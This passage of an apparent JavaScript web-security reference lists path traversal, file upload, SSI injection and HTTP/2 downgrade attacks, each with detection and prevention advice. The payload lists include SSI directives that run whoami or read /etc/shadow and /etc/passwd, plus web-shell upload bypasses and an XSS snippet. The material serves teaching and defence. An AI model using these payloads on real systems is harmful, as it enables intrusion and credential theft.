        "..%25c0%25af..%25c0%25afetc/passwd"
      ],
      detection: "Detect ../ sequences and their encodings in file path parameters. Monitor file access outside expected directories.",
      prevention: "Use a whitelist of allowed files. Canonicalize paths and validate against base directory. Use chroot or containers to limit filesystem access.",
      references: ["https://owasp.org/www-community/attacks/Path_Traversal"],
      cwes: ["CWE-22"]
    },
    {
      name: "File Upload Vulnerabilities",
      category: "Miscellaneous",
      description: "Insufficient validation of uploaded files allows uploading web shells, overwriting critical files, or exploiting file processing libraries.",
      impact: "Remote code execution via web shell. Server compromise. Denial of service via large files or zip bombs.",
      payloads: [
        "Upload PHP shell with .php extension",
        "Upload shell.php.jpg (double extension bypass)",
        "Upload shell.pHp (case variation bypass)",
        "Upload shell.php%00.jpg (null byte bypass - older systems)",
        "Upload .htaccess to enable PHP execution in upload directory",
        "Upload polyglot file (valid JPEG with embedded PHP)",
        "Upload SVG with embedded XSS: <svg><script>alert(1)</script></svg>",
        "Upload HTML file for stored XSS",
        "Content-Type manipulation: image/jpeg with PHP content"
      ],
      detection: "Validate file content (magic bytes), not just extension or Content-Type. Scan uploaded files with antivirus. Monitor for web shells.",
      prevention: "Whitelist allowed extensions. Validate magic bytes. Store uploads outside webroot. Use a CDN/object storage. Rename files on upload. Set Content-Disposition: attachment.",
      references: ["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"],
      cwes: ["CWE-434"]
    },
    {
      name: "Server-Side Include (SSI) Injection",
      category: "Miscellaneous",
      description: "Injection of SSI directives into pages processed by the web server's SSI engine. Can execute commands and include files.",
      impact: "Remote code execution, file inclusion, information disclosure.",
      payloads: [
        '<!--#exec cmd="whoami"-->',
        '<!--#include virtual="/etc/passwd"-->',
        '<!--#exec cmd="cat /etc/shadow"-->',
        '<!--#config timefmt="%D %r"--><!--#echo var="DATE_LOCAL"-->',
        '<!--#exec cmd="id"-->'
      ],
      detection: "Detect SSI directives (<!--#) in user input. Disable SSI processing where not needed.",
      prevention: "Disable SSI on the web server. If needed, restrict to specific directories. Sanitize user input for SSI directives.",
      references: ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"],
      cwes: ["CWE-97"]
    },
    {
      name: "HTTP/2 Downgrade Attacks",
      category: "Miscellaneous",
      description: "Exploiting differences between HTTP/2 front-end and HTTP/1.1 back-end handling. HTTP/2's binary framing can be abused for request smuggling when downgraded to HTTP/1.1.",
      impact: "Request smuggling via H2.CL or H2.TE desync. Cache poisoning. Authentication bypass.",
      payloads: [
        "H2.CL: HTTP/2 request with Content-Length that disagrees with DATA frame length",
        "H2.TE: HTTP/2 request with injected Transfer-Encoding header (normally forbidden in H2 but passed through by some proxies)",
        "CRLF injection in HTTP/2 header values (pseudo-headers bypass)"
      ],
      detection: "Monitor for HTTP/2-to-HTTP/1.1 conversion anomalies. Test with HTTP/2 smuggling tools.",
      prevention: "Use end-to-end HTTP/2. Strip dangerous headers during protocol conversion. Validate Content-Length against actual body length.",
      references: ["https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors"],
      cwes: ["CWE-444"]
    }
  ]
};
